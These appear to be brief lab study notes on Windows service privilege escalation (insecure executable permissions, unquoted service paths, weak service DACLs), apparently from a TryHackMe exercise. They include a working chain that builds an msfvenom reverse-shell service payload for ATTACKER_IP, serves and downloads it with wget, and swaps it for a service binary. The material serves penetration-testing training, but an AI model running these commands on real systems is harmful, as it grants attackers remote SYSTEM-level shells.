**Windows Services:**
To better understand the structure of a service, check the apphostsvc service configuration with:

```
sc qc apphostsvc
```

All of the services configurations are stored on the registry under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\`

**Insecure Permissions on Service Executable:**

Check WindowsScheduler with:

```
sc qc WindowsScheduler
```

Check if you can edit the script with:

```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

Create payload on Attack Machine:
```
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=port -f exe-service -o /var/html/www/rev-svc.exe
```

Start Server to Serve Payload:

```
python3 -m http.server
```

Recieve/Move Payload Into Place:

```
wget http://ATTACKER_IP:port/rev-svc.exe -O rev-svc.exe

move WService.exe WService.exe.bkp

move C:\Users\thm-unpriv\rev-svc.exe WService.exe

icacls WService.exe /grant Everyone:F
```

**Unquoted Service Paths:**
If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.


**Insecure Service Permissions:**
Should DACL allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```
